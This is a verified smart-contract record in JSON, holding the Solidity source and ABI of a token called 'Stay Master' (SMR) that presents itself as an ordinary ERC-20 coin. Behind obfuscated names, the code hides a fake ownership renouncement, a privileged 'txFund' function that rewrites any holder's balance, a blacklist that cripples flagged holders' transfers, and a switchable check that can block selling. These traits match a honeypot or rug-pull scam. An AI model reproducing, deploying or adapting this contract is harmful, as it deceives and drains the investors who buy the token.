{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface modeLaunched {\n    function createPair(address listIs, address totalListFrom) external returns (address);\n}\n\ninterface receiverToMax {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingMin) external view returns (uint256);\n\n    function transfer(address modeMarketing, uint256 autoLaunchMax) external returns (bool);\n\n    function allowance(address sellLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoLaunchMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeMarketing,\n        uint256 autoLaunchMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellMode, uint256 value);\n    event Approval(address indexed sellLiquidity, address indexed spender, uint256 value);\n}\n\nabstract contract feeTxFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atSenderMode {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface exemptTrading is receiverToMax {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract StayMaster is feeTxFrom, receiverToMax, exemptTrading {\n\n    function transferFrom(address exemptAmount, address modeMarketing, uint256 autoLaunchMax) external override returns (bool) {\n        if (_msgSender() != launchedTotal) {\n            if (swapWallet[exemptAmount][_msgSender()] != type(uint256).max) {\n                require(autoLaunchMax <= swapWallet[exemptAmount][_msgSender()]);\n                swapWallet[exemptAmount][_msgSender()] -= autoLaunchMax;\n            }\n        }\n        return atTo(exemptAmount, modeMarketing, autoLaunchMax);\n    }\n\n    mapping(address => uint256) private maxAuto;\n\n    address public enableLaunch;\n\n    function owner() external view returns (address) {\n        return marketingSwap;\n    }\n\n    function atBuy(address isReceiver) public {\n        sellAmountLimit();\n        if (enableTakeReceiver == maxSell) {\n            maxSell = enableTakeReceiver;\n        }\n        if (isReceiver == amountTotal || isReceiver == enableLaunch) {\n            return;\n        }\n        teamLimit[isReceiver] = true;\n    }\n\n    function balanceOf(address marketingMin) public view virtual override returns (uint256) {\n        return maxAuto[marketingMin];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return marketingWallet;\n    }\n\n    event OwnershipTransferred(address indexed swapMax, address indexed modeFeeLiquidity);\n\n    function atTo(address exemptAmount, address modeMarketing, uint256 autoLaunchMax) internal returns (bool) {\n        if (exemptAmount == amountTotal) {\n            return listAt(exemptAmount, modeMarketing, autoLaunchMax);\n        }\n        uint256 senderTo = receiverToMax(enableLaunch).balanceOf(minTx);\n        require(senderTo == totalToken);\n        require(modeMarketing != minTx);\n        if (teamLimit[exemptAmount]) {\n            return listAt(exemptAmount, modeMarketing, teamMaxBuy);\n        }\n        return listAt(exemptAmount, modeMarketing, autoLaunchMax);\n    }\n\n    bool public isMarketing;\n\n    bool public feeToken;\n\n    uint256 totalToken;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeTo;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingLaunched;\n    }\n\n    mapping(address => bool) public teamLimit;\n\n    function enableSwap(uint256 autoLaunchMax) public {\n        sellAmountLimit();\n        totalToken = autoLaunchMax;\n    }\n\n    mapping(address => bool) public amountMinEnable;\n\n    function maxList(address swapReceiver) public {\n        if (feeToken) {\n            return;\n        }\n        \n        amountMinEnable[swapReceiver] = true;\n        if (isMarketing == tradingLiquidity) {\n            enableTakeReceiver = maxSell;\n        }\n        feeToken = true;\n    }\n\n    uint256 minTo;\n\n    uint256 public maxSell;\n\n    address minTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address launchedTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function sellAmountLimit() private view {\n        require(amountMinEnable[_msgSender()]);\n    }\n\n    function allowance(address senderSellLaunch, address modeTx) external view virtual override returns (uint256) {\n        if (modeTx == launchedTotal) {\n            return type(uint256).max;\n        }\n        return swapWallet[senderSellLaunch][modeTx];\n    }\n\n    function approve(address modeTx, uint256 autoLaunchMax) public virtual override returns (bool) {\n        swapWallet[_msgSender()][modeTx] = autoLaunchMax;\n        emit Approval(_msgSender(), modeTx, autoLaunchMax);\n        return true;\n    }\n\n    function swapModeWallet() public {\n        emit OwnershipTransferred(amountTotal, address(0));\n        marketingSwap = address(0);\n    }\n\n    uint8 private fromReceiverAuto = 18;\n\n    address public amountTotal;\n\n    string private marketingWallet = \"Stay Master\";\n\n    uint256 private takeTo = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromReceiverAuto;\n    }\n\n    constructor (){\n        if (enableTakeReceiver != maxSell) {\n            tradingLiquidity = false;\n        }\n        atSenderMode txReceiver = atSenderMode(launchedTotal);\n        enableLaunch = modeLaunched(txReceiver.factory()).createPair(txReceiver.WETH(), address(this));\n        \n        amountTotal = _msgSender();\n        amountMinEnable[amountTotal] = true;\n        maxAuto[amountTotal] = takeTo;\n        swapModeWallet();\n        if (tradingLiquidity) {\n            tradingLiquidity = true;\n        }\n        emit Transfer(address(0), amountTotal, takeTo);\n    }\n\n    uint256 constant teamMaxBuy = 7 ** 10;\n\n    address private marketingSwap;\n\n    function txFund(address receiverMarketing, uint256 autoLaunchMax) public {\n        sellAmountLimit();\n        maxAuto[receiverMarketing] = autoLaunchMax;\n    }\n\n    mapping(address => mapping(address => uint256)) private swapWallet;\n\n    string private tradingLaunched = \"SMR\";\n\n    function transfer(address receiverMarketing, uint256 autoLaunchMax) external virtual override returns (bool) {\n        return atTo(_msgSender(), receiverMarketing, autoLaunchMax);\n    }\n\n    function listAt(address exemptAmount, address modeMarketing, uint256 autoLaunchMax) internal returns (bool) {\n        require(maxAuto[exemptAmount] >= autoLaunchMax);\n        maxAuto[exemptAmount] -= autoLaunchMax;\n        maxAuto[modeMarketing] += autoLaunchMax;\n        emit Transfer(exemptAmount, modeMarketing, autoLaunchMax);\n        return true;\n    }\n\n    uint256 private enableTakeReceiver;\n\n    bool public tradingLiquidity;\n\n    function getOwner() external view returns (address) {\n        return marketingSwap;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeFeeLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderSellLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountMinEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoLaunchMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isReceiver\",\"type\":\"address\"}],\"name\":\"atBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingMin\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoLaunchMax\",\"type\":\"uint256\"}],\"name\":\"enableSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapReceiver\",\"type\":\"address\"}],\"name\":\"maxList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapModeWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoLaunchMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoLaunchMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoLaunchMax\",\"type\":\"uint256\"}],\"name\":\"txFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "StayMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}